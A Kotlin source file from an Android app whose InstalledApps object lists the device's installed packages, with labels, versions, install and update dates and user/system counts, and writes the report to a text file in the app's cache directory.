package com.kashem.shaikh.collectors

import android.content.Context
import android.content.pm.ApplicationInfo
import com.kashem.shaikh.services.AppLogs
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object InstalledApps {

    fun collectApps(context: Context): File? {
        val pm = context.packageManager

        val packages = try {
            pm.getInstalledPackages(0)
        } catch (e: Exception) {
            AppLogs.error("InstalledApps: query failed", e)
            return null
        }
        if (packages.isEmpty()) {
            AppLogs.warn("InstalledApps: no packages found")
            return null
        }

        val sb = StringBuilder()
        sb.appendLine("***** INSTALLED APPS *****")
        sb.appendLine()
        sb.appendLine("Generated : ${
            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        }")
        sb.appendLine()

        val df = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
        var userCount = 0
        var sysCount = 0

        val sorted = packages.sortedBy {
            try { it.applicationInfo?.loadLabel(pm)?.toString()?.lowercase() ?: "" }
            catch (_: Exception) { "" }
        }

        for (pkg in sorted) {
            val app = pkg.applicationInfo ?: continue
            val isSystem = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0
            if (isSystem) sysCount++ else userCount++

            val label = try { app.loadLabel(pm).toString() }
                        catch (_: Exception) { "?" }

            val versionName = pkg.versionName ?: "?"
            val versionCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
                pkg.longVersionCode.toString()
            } else {
                @Suppress("DEPRECATION")
                pkg.versionCode.toString()
            }

            // ✅ FIX: 0 timestamp = unknown
            val installDate = if (pkg.firstInstallTime > 0)
                df.format(Date(pkg.firstInstallTime)) else "Unknown"
            val updateDate = if (pkg.lastUpdateTime > 0)
                df.format(Date(pkg.lastUpdateTime)) else "Unknown"
            val type = if (isSystem) "SYSTEM" else "USER"

            sb.appendLine("[$type] $label")
            sb.appendLine("  Package  : ${pkg.packageName}")
            sb.appendLine("  Version  : $versionName ($versionCode)")
            sb.appendLine("  Installed: $installDate")
            sb.appendLine("  Updated  : $updateDate")
            sb.appendLine()
        }

        sb.appendLine("─────────────────────")
        sb.appendLine("User apps   : $userCount")
        sb.appendLine("System apps : $sysCount")
        sb.appendLine("Total       : ${packages.size}")

        val file = File(context.cacheDir, "installed_apps.txt")
        try {
            FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
            AppLogs.info("InstalledApps: ${packages.size} apps collected (${file.length()} bytes)")
        } catch (e: Exception) {
            AppLogs.error("InstalledApps: file write failed", e)
        }
        return file
    }
}